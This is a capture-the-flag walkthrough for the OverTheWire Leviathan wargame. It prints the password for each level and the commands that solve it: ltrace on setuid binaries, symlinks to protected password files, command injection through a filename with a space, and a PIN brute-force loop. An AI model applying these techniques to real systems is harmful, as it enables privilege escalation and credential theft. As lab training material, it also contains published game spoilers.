# Leviathan
###### tags: `security walkthrough`
## Level 0 (ssh, cat)
```
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0@leviathan.labs.overthewire.org's password: leviathan0
```
```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
```
```
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep "pass"
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```
## Level 1 (ltrace, strcmp)
```
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: 123
)                                     = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 50
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 51
strcmp("123", "sex")                                                      = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                      = 29
+++ exited (status 0) +++
```
```
leviathan1@leviathan:~$ ./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```
## Level 2 (ltrace, ln, code injection)
```
leviathan2@leviathan:/tmp/lv2$ ltrace ~/printfile file.txt
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("file.txt", 4)                                                     = 0
snprintf("/bin/cat file.txt", 511, "/bin/cat %s", "file.txt")             = 17
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat file.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```
```
leviathan2@leviathan:/tmp/lv2$ touch pass\ file.txt
leviathan2@leviathan:/tmp/lv2$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("pass file.txt", 4)                                                = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt")   = 22
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 256
+++ exited (status 0) +++
```
```
leviathan2@leviathan:/tmp/lv2$ ln -s /etc/leviathan_pass/leviathan3 pass
leviathan2@leviathan:/tmp/lv2$ ~/printfile "pass file.txt"
Ahdiemoo1j
```
## Level 3 (ltrace, strcmp)
```
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                = -1
printf("Enter the password> ")                                            = 20
fgets(Enter the password> 123
"123\n", 256, 0xf7fc55a0)                                           = 0xffffd590
strcmp("123\n", "snlprintf\n")                                            = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                = 19
```
```
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
$ cat  /etc/leviathan_pass/leviathan4
vuH0coox6m
$
```
## Level 4 (bin2ascii)
```
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```
* [RapidTables](https://www.rapidtables.com/convert/number/binary-to-ascii.html)
```
Tith4cokei
```
## Level 5 (ltrace, ln)
```
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                               = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                         = 26
exit(-1 <no return ...>
```
```
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```
## Level 6 (brute force)
```
#!/bin/bash

for i in {0000..9999}
do
    ~/leviathan6 $i
done
```
```
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
## Level 7
```
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```